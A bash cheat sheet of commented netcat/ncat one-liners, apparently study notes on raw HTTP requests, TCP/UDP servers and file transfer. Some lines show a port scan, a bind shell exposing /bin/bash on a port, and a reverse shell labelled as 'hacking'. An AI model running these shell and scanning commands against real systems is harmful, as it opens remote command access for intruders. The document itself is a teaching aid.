#!/bin/bash

# http GET request
# -e enables interpretation of CRLF
echo -e "GET index.html HTTP/1.1\r\n\r\n" | nc -v google.com 80

# tcp server
nc -l 1234

# tcp client
nc localhost 1234

# netcat echo server
ncat -v -l -p 5555 -c "while true; do read i && echo [echo] $i; done"

# save nework data to file
nc -l -v 1234 > data.txt

# udp server
nc -v -ul 7000

# file server with input piped into it
cat happy.txt | ncat -v -l -p 5555

# connect to file server and write response
nc localhost 5555 > happy_copy.txt

# port scanning (consider nmap)
# -v verbose
# -n no dns lookup
# -z ignore data from server
# -w 1 wait 1 second for each connection
# ports 75-85
nc -v -n -z -w 1 192.168.1.1 75-85

# remote shell (shell on a remote system without ssh)
# starts a bash process on 7777 and sends the output back
# ncat can convert any process into a server
ncat -v -l -p 7777 -e /bin/bash
echo -e "ls\r\n\r\n" | nc localhost 7777

# reverse shell (hacking)

# ordinary telnet connection
# client (telnet server port) ===> server

# reverse shell
# server ===> hacker machine

# hacker machine starts a server
ncat -v -l -p 8888

# launch reverse shell on target machine
# real hacking techniques include :
# -reverse web scripts
# -buffer overflow exploit
ncat localhost 8888 -e /bin/bash
